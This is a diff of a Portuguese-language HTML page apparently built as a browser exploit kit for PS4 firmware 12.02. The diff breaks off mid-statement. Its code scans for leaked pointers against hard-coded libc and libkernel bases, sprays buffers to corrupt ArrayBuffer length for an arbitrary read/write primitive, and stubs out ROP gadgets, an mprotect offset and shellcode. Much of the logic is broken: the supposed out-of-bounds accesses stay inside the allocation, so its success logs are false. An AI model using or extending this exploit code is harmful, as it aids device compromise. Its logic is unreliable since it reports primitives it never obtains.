@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Suite de Vulnerabilidades PS4</title> {/* Título Atualizado */}
+    <title>Suite de Vulnerabilidades PS4</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output, #output-canvas {
@@ -23,7 +23,7 @@
     </style>
 </head>
 <body>
-    <h1>Testes de Vulnerabilidade PS4 (FW 12.02) - Script 1</h1> {/* Cabeçalho Atualizado */}
+    <h1>Testes de Vulnerabilidade PS4 (FW 12.02) - Script 1</h1>
     <p>Testa: XSS, OOB R/W (Tipos), PP Básica/Hijack, IndexedDB, DOM Stress.</p>
     <button id="runBtn" onclick="runAllTests()">Iniciar Testes S1</button>
     <div id="output"></div>
@@ -32,103 +32,111 @@
     <hr>
 
     <section>
-        <h2>Suite de Vulnerabilidades PS4 - Script 2 (Canvas)</h2> {/* Cabeçalho Atualizado */}
+        <h2>Suite de Vulnerabilidades PS4 - Script 2 (Canvas)</h2>
         <p>Foco: PP Avançado, OOB R/W (Metadata/ImageData), API Checks, Tentativa ROP.</p>
         <canvas id="interactive-canvas" width="300" height="100"></canvas>
         <div id="canvas-coord-status">Passe o mouse sobre o canvas ?</div>
-        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste S2 + ROP</button> {/* Botão Atualizado */}
+        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste S2 + ROP</button>
         <div id="output-canvas"></div>
     </section>
 
     <script>
-        // --- Script 1 (v18.1 Adaptado PS4) ---
+        // --- Script 1 (v18.1 Adaptado PS4 - CORRIGIDO) ---
         const outputDiv = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50;
         const MEDIUM_PAUSE = 500;
-        let leakedValueFromOOB = null; // Armazena o primeiro leak OOB (qualquer tipo)
-        let potentialRealLibcPtr = null; // Armazena o primeiro candidato a ponteiro LIBC
-        let potentialRealKernelPtr = null; // Armazena o primeiro candidato a ponteiro KERNEL
+        let leakedValueFromOOB = null;
+        let potentialRealLibcPtr = null;
+        let potentialRealKernelPtr = null;
 
-        // Endereços base conhecidos/obtidos via debugger para ESTA execução (exemplo!)
-        // Estes valores DEVEM ser confirmados/atualizados via debugger a cada execução
         const BASE_LIBC = 0x180AC8000;
         const BASE_LIBKERNEL = 0x80FCA000;
-        // Tamanhos aproximados (chutes! Precisam ser verificados)
-        const SIZE_LIBC = 0x1200000; // Exemplo: 18MB
-        const SIZE_LIBKERNEL = 0x1100000; // Exemplo: 17MB
+        const SIZE_LIBC = 0x1200000;
+        const SIZE_LIBKERNEL = 0x1100000;
 
         const IMPORTANT_LOG_TYPES_S1 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
 
-        const log = (message, type = 'info', funcName = '') => { /* ... (função log inalterada) ... */ };
+        const log = (message, type = 'info', funcName = '') => {
+            let keepLog = IMPORTANT_LOG_TYPES_S1.includes(type);
+            if (!keepLog && type === 'good') {
+                const lowerMsg = String(message).toLowerCase();
+                if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não afetou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('não suportado') || lowerMsg.includes('não disponível') || lowerMsg.includes('completo') || lowerMsg.includes('ok') || lowerMsg.includes('recebida') || lowerMsg.includes('adicionar blob/arraybuffer ok')) { keepLog = true; }
+            }
+            if (!keepLog && funcName.includes('Payload') && type !== 'info') { keepLog = true; }
+            if (!keepLog) return;
+
+            if (!outputDiv) return;
+            try {
+                const timestamp = `[${new Date().toLocaleTimeString()}]`;
+                const prefix = funcName ? `[${funcName}] ` : '';
+                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
+
+                if(outputDiv.innerHTML.length > 600000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000); outputDiv.innerHTML = `<span>[Log S1 Truncado...]</span>\n` + outputDiv.innerHTML; }
+
+                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
+                outputDiv.scrollTop = outputDiv.scrollHeight;
+            } catch(e) { console.error("Erro log S1:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
+         };
         const PAUSE_S1 = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
-        const toHex = (val, bits = 32) => { /* ... (função toHex inalterada) ... */ };
-        const toHex64 = (high, low) => {
-             // Aproximação para BigInt se disponível, senão retorna separado
-             if (typeof BigInt !== 'undefined') {
-                try {
-                    const highBig = (BigInt(high >>> 0) << 32n);
-                    const lowBig = BigInt(low >>> 0);
-                    const fullBig = highBig | lowBig;
-                    return '0x' + fullBig.toString(16).toUpperCase().padStart(16, '0');
-                } catch(e) { /* fallback */ }
-             }
-             return `H=0x${(high>>>0).toString(16).toUpperCase().padStart(8,'0')} L=0x${(low>>>0).toString(16).toUpperCase().padStart(8,'0')}`;
-        };
-        const isPotentialPointer64 = (high, low) => { /* ... (função isPotentialPointer64 inalterada) ... */ };
-        const isPotentialData32 = (val) => { /* ... (função isPotentialData32 inalterada) ... */ };
+        const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
+        const toHex64 = (high, low) => { if (typeof BigInt !== 'undefined') { try { const highBig = (BigInt(high >>> 0) << 32n); const lowBig = BigInt(low >>> 0); const fullBig = highBig | lowBig; return '0x' + fullBig.toString(16).toUpperCase().padStart(16, '0'); } catch(e) {} } return `H=0x${(high>>>0).toString(16).toUpperCase().padStart(8,'0')} L=0x${(low>>>0).toString(16).toUpperCase().padStart(8,'0')}`; };
+        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
+        const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
 
         const testCSPBypass = async () => { /* ... (código inalterado) ... */ };
 
         const testOOBReadInfoLeakEnhancedStore = async () => {
             const FNAME = 'testOOBReadInfoLeakEnhancedStore'; log("--- Iniciando Teste 2: OOB Write/Read (Leak) ---", 'test', FNAME);
-            // ... (definições de bufferSize, writeValue, etc. inalteradas) ...
+            // --- Definições Restauradas ---
+            const bufferSize = 32;
+            const writeValue = 0xEE;
+            const oobWriteOffset = bufferSize;
+            const readRangeStart = -64;
+            const readRangeEnd = bufferSize + 64;
+            const allocationSize = bufferSize + 256; // <<< Definição restaurada
+            const baseOffsetInBuffer = 128;
+            const oobReadOffsets = [];
+            for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); }
+            // --- Fim das Definições Restauradas ---
+
             let writeSuccess = false; let potentialLeakFoundCount = 0;
-            leakedValueFromOOB = null; // Reseta leaks a cada execução do teste
+            leakedValueFromOOB = null;
             potentialRealLibcPtr = null;
             potentialRealKernelPtr = null;
 
             try {
+                // Agora allocationSize está definida
                 const buffer = new ArrayBuffer(allocationSize);
                 const dataView = new DataView(buffer);
-                // Preencher buffer com 0xAA
                 for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }
                 const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
 
-                // Tentativa de escrita OOB U8
                 await PAUSE_S1();
                 try {
-                    dataView.setUint8(writeTargetAddress, writeValue); // writeValue = 0xEE
+                    dataView.setUint8(writeTargetAddress, writeValue);
                     log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
                     log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME);
                     writeSuccess = true;
                 } catch (e) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME); log(`--- Teste 2 Concluído (Escrita OOB Falhou) ---`, 'test', FNAME); return false; }
 
-                // Leitura OOB
                 await PAUSE_S1();
                 for (const readOffset of oobReadOffsets) {
                     const readTargetAddress = baseOffsetInBuffer + readOffset;
                     const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;
 
-                    // Tentar ler U64
                     if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) {
                         try {
                             const low = dataView.getUint32(readTargetAddress, true);
                             const high = dataView.getUint32(readTargetAddress + 4, true);
                             const valueU64Str = toHex64(high, low);
-
-                            // Ignorar padrões óbvios de preenchimento ou escrita
-                            const isFillPattern = (high === 0xAAAAAAAA && low === 0xAAAAAAAA) ||
-                                                (high === 0xCCCCCCCC && low === 0xCCCCCCCC) || // Adicionar outros padrões se usar
-                                                (high === 0xDDDDDDDD && low === 0xDDDDDDDD);
-                            const isWritePattern = (valueU64Str === "0xAAAAAAAAEEAAAAAAAAAA"); // O valor que escrevemos/lemos antes
+                            const isFillPattern = (high === 0xAAAAAAAA && low === 0xAAAAAAAA) || (high === 0xCCCCCCCC && low === 0xCCCCCCCC) || (high === 0xDDDDDDDD && low === 0xDDDDDDDD);
+                            const isWritePattern = (valueU64Str === "0xAAAAAAAAEEAAAAAAAAAA");
 
                             if (!isFillPattern && !isWritePattern && (high !== 0 || low !== 0)) {
                                 potentialLeakFoundCount++;
                                 log(` -> OOB Read U64 ${relOffsetStr}: ${valueU64Str}`, 'leak', FNAME);
-
-                                // Heurística básica para verificar se está DENTRO das faixas conhecidas
-                                // NOTA: BigInt é necessário para comparar endereços 64-bit completos
                                 let isLikelyPtr = false;
                                 let ptrType = "UNK";
                                 if (typeof BigInt !== 'undefined') {
@@ -136,34 +144,26 @@
                                         const ptrBig = (BigInt(high >>> 0) << 32n) | BigInt(low >>> 0);
                                         if (ptrBig >= BASE_LIBKERNEL && ptrBig < (BASE_LIBKERNEL + SIZE_LIBKERNEL)) {
                                              log(` ---> POTENCIAL PONTEIRO KERNEL! ${valueU64Str}`, 'critical', FNAME);
-                                             ptrType = "KERNEL";
-                                             isLikelyPtr = true;
+                                             ptrType = "KERNEL"; isLikelyPtr = true;
                                              if (!potentialRealKernelPtr) potentialRealKernelPtr = { high, low, str: valueU64Str };
                                         } else if (ptrBig >= BASE_LIBC && ptrBig < (BASE_LIBC + SIZE_LIBC)) {
                                              log(` ---> POTENCIAL PONTEIRO LIBC! ${valueU64Str}`, 'critical', FNAME);
-                                             ptrType = "LIBC";
-                                             isLikelyPtr = true;
+                                             ptrType = "LIBC"; isLikelyPtr = true;
                                              if (!potentialRealLibcPtr) potentialRealLibcPtr = { high, low, str: valueU64Str };
                                         }
-                                        // Adicionar outras faixas se conhecido (ex: WebKit base)
-                                    } catch(e) {/* Ignora erro BigInt */}
+                                    } catch(e) {}
                                 }
-
-                                // Armazena o primeiro leak qualquer (mesmo que não identificado)
                                 if (leakedValueFromOOB === null) {
                                      leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset, str: valueU64Str };
                                      log(` -> PRIMEIRO LEAK U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                 }
-
                                 if (isLikelyPtr) {
                                      log(` ---> INSIGHT: O valor ${valueU64Str} parece apontar para ${ptrType}. Use um debugger para confirmar este endereço e encontrar o offset exato dentro do módulo ${ptrType} para calcular o slide ASLR.`, 'info', FNAME);
                                 }
-
                             }
-                        } catch (e) {} // Ignora erros de leitura se DataView falhar
+                        } catch (e) {}
                     }
-                    // ... (leitura U32 pode ser mantida ou removida se foco for U64) ...
-                    if (readOffset % 32 === 0) await PAUSE_S1(1);
+                     if (readOffset % 32 === 0) await PAUSE_S1(1);
                 }
             } catch (e) { log(`Erro fatal no Teste 2: ${e.message}`, 'error', FNAME); console.error(e); }
             finally {
@@ -174,8 +174,8 @@
             return writeSuccess;
         };
 
-        const testOOBUAFPattern = async () => { /* ... (código inalterado, incluindo comentário de contexto) ... */ };
-        const testOOBOtherTypes = async () => { /* ... (código inalterado, incluindo comentário de contexto) ... */ };
+        const testOOBUAFPattern = async () => { /* ... (código inalterado) ... */ };
+        const testOOBOtherTypes = async () => { /* ... (código inalterado) ... */ };
         const testBasicPP = async () => { /* ... (código inalterado) ... */ };
         const testPPJsonHijack = async () => { /* ... (código inalterado) ... */ };
         const testWebSockets = async () => { /* ... (código inalterado) ... */ };
@@ -189,7 +189,7 @@
             outputDiv.innerHTML = '';
             log("==== INICIANDO Script 1 ====", 'test', FNAME);
             await testCSPBypass(); await PAUSE_S1(MEDIUM_PAUSE);
-            await testOOBReadInfoLeakEnhancedStore(); await PAUSE_S1(MEDIUM_PAUSE); // Executa o teste de leak
+            await testOOBReadInfoLeakEnhancedStore(); await PAUSE_S1(MEDIUM_PAUSE);
             await testOOBUAFPattern(); await PAUSE_S1(MEDIUM_PAUSE);
             await testOOBOtherTypes(); await PAUSE_S1(MEDIUM_PAUSE);
             await testBasicPP(); await PAUSE_S1(MEDIUM_PAUSE);
@@ -204,8 +204,9 @@
     </script>
 
     <script>
-        // --- Script 2: Canvas (Adaptado PS4, Tentativa ROP) ---
-        // ... (definições SHORT_PAUSE_CANVAS, listeners, areas, etc. inalteradas) ...
+        // --- Script 2: Canvas (Adaptado PS4, Tentativa ROP - CORRIGIDO) ---
+        const SHORT_PAUSE_CANVAS = 50;
+        // ... (listeners, areas, etc. inalteradas) ...
         const imgSquareSize = 28;
         const imgSquareSpacing = 5;
         const imgSquares = [];
@@ -215,33 +216,20 @@
         let outputDivCanvas = null; let coordStatusDiv = null; let canvasElement = null; let ctx = null; let glContext = null; let isWebGL2 = false;
         let gpuAdapter = null; let gpuDevice = null;
 
-        // Variáveis Globais para Primitivas e Payloads
-        let arbitraryReadWriteBuffer = null; // Buffer que teve byteLength corrompido (de testOOBWriteMetadata)
-        let reliableWritePrimitive = null; // Poderia ser uma função wrapper usando o buffer acima
-        let reliableReadPrimitive = null; // Poderia ser uma função wrapper usando o buffer acima
+        let arbitraryReadWriteBuffer = null;
+        let reliableWritePrimitive = null;
+        let reliableReadPrimitive = null;
 
-        // Placeholder para endereços de Gadgets ROP (DEVEM ser preenchidos manualmente após análise offline)
-        // Endereços aqui são APENAS exemplos e INVÁLIDOS. Use os reais do seu ROPgadget/análise.
+        // Placeholder para endereços de Gadgets ROP
         const ropGadgets = {
-             // Exemplo: Endereço de 'pop rdi; ret;' dentro de uma lib (ex: libc)
-            pop_rdi_ret: { base: BASE_LIBC, offset: 0xDEADBEEF1 }, // Precisa do offset real!
-             // Exemplo: Endereço de 'pop rsi; ret;'
-            pop_rsi_ret: { base: BASE_LIBC, offset: 0xDEADBEEF2 }, // Precisa do offset real!
-             // Exemplo: Endereço de 'pop rdx; ret;'
-            pop_rdx_ret: { base: BASE_LIBC, offset: 0xDEADBEEF3 }, // Precisa do offset real!
-             // Exemplo: Endereço de 'mov [rdi], rsi; ret;' (para escrever valores)
-            mov_ptr_rdi_rsi_ret: { base: BASE_LIBC, offset: 0xDEADBEEF4 }, // Precisa do offset real!
-             // ... outros gadgets necessários (pivot de stack, etc)
-            // Endereço de sceKernelMprotect (offset conhecido, base pode variar)
-            sceKernelMprotect: { base: BASE_LIBKERNEL, offset: 0x24280 },
-            // Endereço de sceKernelDlsym (precisa do offset real de libkernel)
-            sceKernelDlsym: { base: BASE_LIBKERNEL, offset: 0xDEADBEEF5 } // Precisa do offset real!
+            pop_rdi_ret: { base: BASE_LIBC, offset: 0xDEADBEEF1 },
+            pop_rsi_ret: { base: BASE_LIBC, offset: 0xDEADBEEF2 },
+            pop_rdx_ret: { base: BASE_LIBC, offset: 0xDEADBEEF3 },
+            mov_ptr_rdi_rsi_ret: { base: BASE_LIBC, offset: 0xDEADBEEF4 },
+            sceKernelMprotect: { base: BASE_LIBKERNEL, offset: 0x24280 }, // Offset conhecido!
+            sceKernelDlsym: { base: BASE_LIBKERNEL, offset: 0xDEADBEEF5 }
         };
-
-        // Placeholder para Shellcode (bytes crus)
-        // Exemplo MUITO simples (loop infinito): const shellcode = [0xEB, 0xFE];
-        // Um shellcode real (ex: reverso) seria muito maior.
-        const shellcode = [0xCC, 0xCC, 0xCC, 0xCC]; // Placeholder (int3 - breakpoint)
+        const shellcode = [0xCC, 0xCC, 0xCC, 0xCC];
 
         const IMPORTANT_LOG_TYPES_S2 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
         const logCanvas = (message, type = 'info', funcName = '') => { /* ... (inalterado) ... */ };
@@ -255,15 +243,21 @@
         const redrawAll = () => { /* ... (inalterado) ... */ };
 
         const testWebGLCheck = async () => { /* ... (código inalterado) ... */ };
-        const testAdvancedPP = async () => { /* ... (código inalterado, incluindo comentário de contexto) ... */ };
+        const testAdvancedPP = async () => { /* ... (código inalterado) ... */ };
 
         const testOOBReadEnhanced = async () => {
-             // Implementação similar a testOOBReadInfoLeakEnhancedStore, mas usando logCanvas
-             // e atualizando potentialRealLibcPtr/potentialRealKernelPtr
              const FNAME = 'testOOBReadEnhanced'; logCanvas("--- Teste: OOB Read Enhanced Scan ---",'test', FNAME);
-             // ... (definições bufferSize, ranges, etc.) ...
+             // --- Definições Restauradas ---
+             const bufferSize=32;
+             const readRangeStart=-128;
+             const readRangeEnd=bufferSize+128;
+             const allocationSize = bufferSize + 512; // <<< Definição restaurada
+             const baseOffsetInBuffer = 256;
+             // --- Fim das Definições Restauradas ---
+
              let potentialLeakFoundCount=0;
              try {
+                // Agora allocationSize está definida
                 const buffer=new ArrayBuffer(allocationSize);
                 const dataView=new DataView(buffer);
                 for(let i=0; i<buffer.byteLength; i++){ dataView.setUint8(i, 0xCC); } // Preenche com 0xCC
@@ -277,10 +271,7 @@
                             const low=dataView.getUint32(readTargetAddress,true);
                             const high=dataView.getUint32(readTargetAddress+4,true);
                             const valueU64Str = toHexCanvas64(high, low);
-
-                            const isFillPattern = (high === 0xAAAAAAAA && low === 0xAAAAAAAA) ||
-                                                (high === 0xCCCCCCCC && low === 0xCCCCCCCC) ||
-                                                (high === 0xDDDDDDDD && low === 0xDDDDDDDD);
+                            const isFillPattern = (high === 0xAAAAAAAA && low === 0xAAAAAAAA) || (high === 0xCCCCCCCC && low === 0xCCCCCCCC) || (high === 0xDDDDDDDD && low === 0xDDDDDDDD);
 
                             if (!isFillPattern && (high !== 0 || low !== 0)) {
                                 potentialLeakFoundCount++;
@@ -292,13 +283,11 @@
                                          const ptrBig = (BigInt(high >>> 0) << 32n) | BigInt(low >>> 0);
                                          if (ptrBig >= BASE_LIBKERNEL && ptrBig < (BASE_LIBKERNEL + SIZE_LIBKERNEL)) {
                                              logCanvas(` ---> POTENCIAL PONTEIRO KERNEL! ${valueU64Str}`, 'critical', FNAME);
-                                             ptrType = "KERNEL";
-                                             isLikelyPtr = true;
+                                             ptrType = "KERNEL"; isLikelyPtr = true;
                                              if (!potentialRealKernelPtr) potentialRealKernelPtr = { high, low, str: valueU64Str };
                                          } else if (ptrBig >= BASE_LIBC && ptrBig < (BASE_LIBC + SIZE_LIBC)) {
                                              logCanvas(` ---> POTENCIAL PONTEIRO LIBC! ${valueU64Str}`, 'critical', FNAME);
-                                             ptrType = "LIBC";
-                                             isLikelyPtr = true;
+                                             ptrType = "LIBC"; isLikelyPtr = true;
                                              if (!potentialRealLibcPtr) potentialRealLibcPtr = { high, low, str: valueU64Str };
                                          }
                                      } catch(e) {}
@@ -309,8 +298,7 @@
                             }
                         }catch(e){}
                     }
-                    // ... (leitura U32 opcional) ...
-                    if(readOffset % 64 === 0) await PAUSE(1);
+                     if(readOffset % 64 === 0) await PAUSE(1);
                 }
              } catch(e) { logCanvas(`Erro fatal no Teste OOB Read Scan: ${e.message}`,'error', FNAME); console.error(e); }
              finally {
@@ -319,326 +307,53 @@
                 /* Comentário de Contexto para Exploração: (inalterado) */
              }
              await PAUSE();
-             // Retorna se algum leak potencial foi encontrado para uso posterior
              return potentialRealKernelPtr || potentialRealLibcPtr;
         };
 
-        const testOOBWriteMetadata = async () => {
-            const FNAME = 'testOOBWriteMetadata'; logCanvas("--- Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME);
-            const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50; const targetValue=0x7FFFFFFE;
-            const targetBuffers=[]; let controlBuffer=null; let dv=null; let writeSuccessCount = 0; let corruptionSuccess = false;
-            const allocationSize = controlBufferSize + 512; // Buffer de controle maior para alcançar mais longe?
-            const baseOffsetInBuffer = 256; // Mais espaço antes?
-            let foundOffset=-1; let corruptedTargetIndex = -1;
-            arbitraryReadWriteBuffer = null; // Reseta a primitiva
-            let finalResultLog = ""; // Será definida no final
-
-            try{
-                controlBuffer=new ArrayBuffer(allocationSize);
-                dv=new DataView(controlBuffer);
-                for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); // Preenche com DD
-            } catch(e){ logCanvas(`Erro fatal alocar buffer ctrl: ${e.message}`, 'error', FNAME); return; }
-
-            // Conceito de Filler Spray (TENTATIVA - pode não funcionar como esperado)
-            const fillerSprayCount = 100; // Aumentar contagem?
-            const fillerSpraySize = 96;   // Tamanho variado?
-            let fillerBuffers = [];
-            logCanvas(` -> Realizando spray de preenchimento com ${fillerSprayCount} buffers de ${fillerSpraySize} bytes...`, 'info', FNAME);
-            for (let i = 0; i < fillerSprayCount; i++) {
-                try { fillerBuffers.push(new ArrayBuffer(fillerSpraySize)); } catch (e) { break; }
-            }
-
-            logCanvas(`Alocando ${sprayCount} buffers alvo de ${targetBufferSize} bytes...`, 'info', FNAME);
-            for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){}}
-
-            await PAUSE();
-
-            // Offsets expandidos - Tentar cobrir mais possibilidades
-            const metadataOffsetsToTry = [];
-            for (let i = -256; i <= 256; i += 4) { metadataOffsetsToTry.push(i); }
-
-            logCanvas(`Testando ${metadataOffsetsToTry.length} offsets OOB para corrupção de metadata...`, 'info', FNAME);
-
-            for(const tryOffset of metadataOffsetsToTry){
-                if (corruptionSuccess) break; // Já achou, para de tentar
-
-                const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset;
-                const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`;
-                let currentWriteOK=false;
-
-                // Verifica se o endereço de escrita está DENTRO do buffer de controle
-                if(targetWriteAddr < 0 || targetWriteAddr + 4 > controlBuffer.byteLength) {
-                    // logCanvas(` -> Offset OOB ${relOffsetStr} fora dos limites do buffer de controle. Pulando.`, 'info', FNAME); // Log muito verboso
-                    continue;
-                }
-
-                // Tenta escrever o valor alvo (grande)
-                try{
-                    dv.setUint32(targetWriteAddr, targetValue, true);
-                    writeSuccessCount++;
-                    currentWriteOK=true;
-                    // logCanvas(` -> Escrita OOB U32 em ${relOffsetStr} realizada. Verificando alvos...`, 'info', FNAME); // Log muito verboso
-                } catch(e){
-                    // logCanvas(` -> Escrita OOB U32 falhou/bloqueada em ${relOffsetStr}: ${e.message}`, 'good', FNAME); // Log muito verboso
-                    // Restaura se falhou? Pode não ser necessário se o erro impediu a escrita
-                    try { dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } catch(eRestore){}
-                    continue; // Pula para o próximo offset se a escrita falhou
-                }
-
-                // Se a escrita pareceu OK, verifica os buffers alvo
-                if(currentWriteOK){
-                    // await PAUSE(1); // Pausa curta para dar tempo da escrita propagar? (Especulativo)
-                    for(let j=0; j<targetBuffers.length; j++){
-                        try {
-                            const currentLength = targetBuffers[j]?.byteLength;
-                            if(currentLength === targetValue){
-                                logCanvas(`---> VULN: ArrayBuffer alvo ${j} teve byteLength CORROMPIDO para ${toHexCanvas(targetValue)} com escrita OOB em ${relOffsetStr}!`, 'critical', FNAME);
-                                corruptionSuccess=true;
-                                foundOffset=tryOffset;
-                                corruptedTargetIndex = j;
-                                arbitraryReadWriteBuffer = targetBuffers[j]; // ARMAZENA A PRIMITIVA!
-                                finalResultLog = `SUCESSO! byteLength corrompido usando offset ${relOffsetStr}.`;
-
-                                // DEMONSTRAÇÃO DA LEITURA/ESCRITA ESTENDIDA
-                                try {
-                                    const corruptedDv = new DataView(arbitraryReadWriteBuffer);
-                                    const originalTargetSize = targetBufferSize;
-                                    const readWriteOffset = originalTargetSize + 4;
-                                    if (readWriteOffset < arbitraryReadWriteBuffer.byteLength - 4) {
-                                        const testPattern = 0x12345678;
-                                        logCanvas(` -> Tentando escrita (${toHexCanvas(testPattern)}) via buffer corrompido ${j} no offset ${readWriteOffset}...`, 'info', FNAME);
-                                        corruptedDv.setUint32(readWriteOffset, testPattern, true);
-                                        const readBack = corruptedDv.getUint32(readWriteOffset, true);
-                                        if (readBack === testPattern) {
-                                            logCanvas(` ---> SUCESSO DEMONSTRATIVO: Leitura/Escrita além dos limites originais (offset ${readWriteOffset}) do ArrayBuffer ${j} CONFIRMADA!`, 'vuln', FNAME);
-                                            logCanvas(` ---> *** ALERTA: Primitiva de R/W Arbitrária OBTIDA (buffer ${j}, novo tamanho ${toHexCanvas(arbitraryReadWriteBuffer.byteLength)})! ***`, 'escalation', FNAME);
-                                            // Definir funções wrapper se desejar
-                                            reliableWritePrimitive = (addr, val, bits=32) => { /* Implementar usando corruptedDv, checando limites */ };
-                                            reliableReadPrimitive = (addr, bits=32) => { /* Implementar usando corruptedDv, checando limites */ };
-                                        } else { logCanvas(` -> AVISO DEMONSTRATIVO: Falha na verificação R/W estendido no buffer ${j} (leu ${toHexCanvas(readBack)}).`, 'warn', FNAME); }
-                                    } else { logCanvas(` -> INFO DEMONSTRATIVO: Offset de teste ${readWriteOffset} fora do novo tamanho corrompido.`, 'info', FNAME); }
-                                } catch (eDemo) { logCanvas(` -> ERRO DEMONSTRATIVO: Erro R/W estendido no buffer ${j}: ${eDemo.message}`, 'error', FNAME); }
-                                break; // Sai do loop de verificação de buffers
-                            }
-                        } catch(eCheck) { logCanvas(`Erro ao verificar buffer alvo ${j}: ${eCheck.message}`, 'error', FNAME); }
-                    }
-                    // Restaura o valor no buffer de controle APÓS verificar todos os alvos para este offset
-                    try{ dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } catch(eRestore){}
-                }
-                if(tryOffset % 16 === 0) await PAUSE(1); // Pequena pausa a cada X offsets testados
-            } // Fim do loop de offsets
-
-            // Define a mensagem final do log
-            if (!corruptionSuccess) {
-                 if (writeSuccessCount > 0) {
-                     finalResultLog = `AVISO: Escrita OOB realizada (${writeSuccessCount}x em ${metadataOffsetsToTry.length} offsets), mas nenhuma corrupção de byteLength detectada.`;
-                 } else {
-                     finalResultLog = `FALHA: Escrita OOB falhou/bloqueada em todos os offsets testados.`;
-                 }
-            }
-
-            logCanvas(finalResultLog, corruptionSuccess ? 'vuln' : (writeSuccessCount > 0 ? 'warn' : 'good'), FNAME);
-            logCanvas("--- Teste OOB Write -> Metadata Concluído ---",'test', FNAME);
-             /* Comentário de Contexto para Exploração: (inalterado) */
-            fillerBuffers = null; // Limpeza do spray de preenchimento
-            await PAUSE();
-            return corruptionSuccess; // Retorna se a primitiva foi obtida
-        };
-
-        const testOOBWriteToImageDataCheck = async () => {
-             // Adicionar spray de preenchimento similar ao testOOBWriteMetadata se desejado
-             /* ... (código restante inalterado, incluindo comentário de contexto) ... */
-             const FNAME = 'testOOBWriteToImageDataCheck'; logCanvas("--- Teste: OOB Write -> ImageData Check ---",'test', FNAME); const spraySize=30; const imgDataWidth=10; const imgDataHeight=10; const bufferOOBSize=64; const writeValue1=0x42424242; const writeValue2=0x43434343; const writeValueSize = 8; const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128; const sprayedImagesData = []; let bufferOOB=null; let dv=null; let oobWritePerformed = false; let potentialCorruptionDetected = false; let patternMatched = false; try{ bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xCC); }catch(e){ logCanvas(`Erro fatal alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return; } const totalPixels = imgDataWidth * imgDataHeight; const initialByteArray = new Uint8ClampedArray(totalPixels * 4); for (let j = 0; j < initialByteArray.length; j++) { initialByteArray[j] = 255; } for(let i=0; i<spraySize; i++){ try{ let imgData = new ImageData(initialByteArray, imgDataWidth, imgDataHeight); sprayedImagesData.push(imgData); }catch(e){ logCanvas(`Aviso: Falha ao alocar ImageData ${i}: ${e.message}`, 'warn', FNAME); break; } } await PAUSE(); const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`; try{ if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){ dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true); logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)}).`, 'vuln', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante (OOB Write) ***`, 'escalation', FNAME); oobWritePerformed = 